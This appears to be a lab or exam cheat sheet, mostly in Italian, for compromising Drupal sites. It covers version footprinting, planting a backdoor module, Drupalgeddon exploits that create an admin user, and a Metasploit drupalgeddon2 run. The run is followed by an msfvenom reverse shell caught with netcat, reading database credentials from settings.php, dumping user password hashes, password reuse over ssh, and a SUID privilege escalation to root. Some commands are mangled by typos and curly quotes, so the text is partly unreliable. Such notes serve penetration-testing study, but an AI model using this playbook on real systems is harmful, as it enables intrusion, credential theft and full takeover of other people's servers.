
#### Footprinting
```
# Version Drupal:
> curl -s http://drupal.inlanefreight.local | grep Drupal
> curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
> /core/install.php

# Enumeration Page:
Verificare se si hanno dei path /node, Drupal utilizza i nodi per indicizzare il contenuto.
/node/1
/attachment/1


# File utili:
Presenza di un CHANGELOG.txt file o README.txt file 

# Caratteri non gestiti:
/ì
/è  
/en/£

```

#### Tools
```
# droopescan
> droopescan scan drupal -u



Nelle versioni precedenti di Drupal (prima della versione 8), era possibile accedere come amministratore e abilitare il PHP filtermodulo che "Consente la valutazione del codice/snippet PHP incorporato".

- sito/#overlay=admin/modules
Da qui, potremmo selezionare la casella di controllo accanto al modulo e scorrere fino a Save configuration. Successivamente, potremmo andare su Contenuto --> Aggiungi contenuto e creare un file Basic page.

- sito/#overlay=node/add

Dalla versione 8 in poi, il modulo PHP Filter non è installato di default. Per sfruttare questa funzionalità, dovremmo installare noi stessi il modulo. Dato che modificheremo e aggiungeremo qualcosa all'istanza Drupal del cliente, potremmo voler verificare prima con loro. Inizieremo scaricando la versione più recente del modulo dal sito Web Drupal.  

- wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz  

Accedere a sito/admin/reports/updates/install (Administration> Reports> Available updates.)


Caricamento di un modulo backdoor Se si hannoi i permessi amministrativi è possibile caricare una cartella con un modulo nel quale inserire la backdoor, caricando il modulo + .httpaccess per potervi accedere.  

Path utili: 
/rss.xml
user/login 
user/register 
/phpmyadmin
Submitted by -> Cercare tutti i nodi contenenti questo
/core/modules/dblog/src/Logger/DbLog.php

waybackmachine: /sitemap /author /admin
```
#### Vulnerabilità Note
```
### Drupalgeddon v.1
Nel corso degli anni, il core Drupal ha sofferto di alcune gravi vulnerabilità legate all'esecuzione di codice in modalità remota, ciascuna denominata Drupalgeddon. Al momento in cui scrivo, esistono 3 vulnerabilità Drupalgeddon.

# Druppalgeddon
Metasploit: exploit/multi/http/drupal_drupageddon
CVE-2014-3704 , noto come Drupalgeddon, influisce sulle versioni dalla 7.0 alla 7.31 ed è stato corretto nella versione 7.32. Si trattava di un difetto di SQL injection pre-autenticato che poteva essere utilizzato per caricare un modulo dannoso o creare un nuovo utente amministratore.  python2.7 drupalgeddon.py thon2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd  Otteniamo un nuovo utente amministrativo.

# Druppalgeddon2
CVE-2018-7600 , nota anche come Drupalgeddon2, è una vulnerabilità legata all'esecuzione di codice in modalità remota che colpisce le versioni di Drupal precedenti alla 7.58 e alla 8.5.1. La vulnerabilità si verifica a causa di un'insufficiente sanificazione dell'input durante la registrazione dell'utente, consentendo l'inserimento dannoso di comandi a livello di sistema.


# Druppalgeddon3
CVE-2018-7602 , noto anche come Drupalgeddon3, è una vulnerabilità legata all'esecuzione di codice in modalità remota che colpisce più versioni di Drupal 7.x e 8.x. Questo difetto sfrutta la convalida impropria nell'API del modulo.




```


#### Metasploit
```
### Metasploit
> search drupal
> use exploit/unix/webapp/drupal_drupalgeddon2
> show options
> set TARGETURI /drupal/
> run


Open the new terminal and generate one msfvenom payload:
> msfvenom —payload linux/x86/shell_reverse_tcp —platform linux LHOST=kali ip LPORT=1234 -f elf -o sh.elf 
> nc -lvnp 1234

Now again go to meterpreter session:
meterpreter> upload sh.elf
Upload completed

Bow open shell session

meterpretrr> shell
chmod +x sh.elf

Now execute this:
./sh.elf

Now we got reverse shell in the netcat that listening
Now terminate the meterpreter session, and go to netcat got reverse shell


python -c ‘import pty;pty.spawn(”/bin/bash”)’
got shell
www-data@DC-1:/var/www$ export TERM=xterm
now press ctrl Z 

now type this command in the same terminal 
$ stty raw echo;fg;reset
Now enter ctrl C 

Now we got full interactive shell 
www-data@DC-1:/var/www$


DB Enum:
www-data@DC-1:/var/www$ ls
www-data@DC-1:/var/www$ cd sites
www-data@DC-1:/var/www/sites$ ls
www-data@DC-1:/var/www$ cd default 
www-data@DC-1:/var/www/sites/default$ ls
www-data@DC-1:/var/www/sites/default$ cat settings.php 
We will get the database credentials in the settings.php file 

Now login to mysql database using the cred we get in the settings.php file 
www-data@DC-1:/var/www$ mysql -u dbuser -D drupaldb -p 
password: R0ck3t
Login successful 

mysql> show databases;
mysql> use drupaldb;  in exam it is syntex
mysql> show tables;
mysql> SELECT * FROM users;
mysql> SELECT name,pass,mail FROM users;
copy all the details and exit it 
mysql> exit


Login to user Acc:
Now login via ssh
$ ssh auditor@198.168.100.52
passwrd: qwertyuiop
Login successful to auditor terminal
get flag of user

Another way:
www-data@DC-1:/var/www$ `su auditor`
enter password: qwertyuiop
Login successful to auditor terminal
auditor@kalilinux$ get the user flag here

Priv Esc:
Now priv escalation to get admin - SUID

www-data@DC-1:/var/www$ `find /etc/passwd -exec ‘/bin/sh’ \\;
the above command will give root access shell
#cd /root
#ls
get the root flag here

```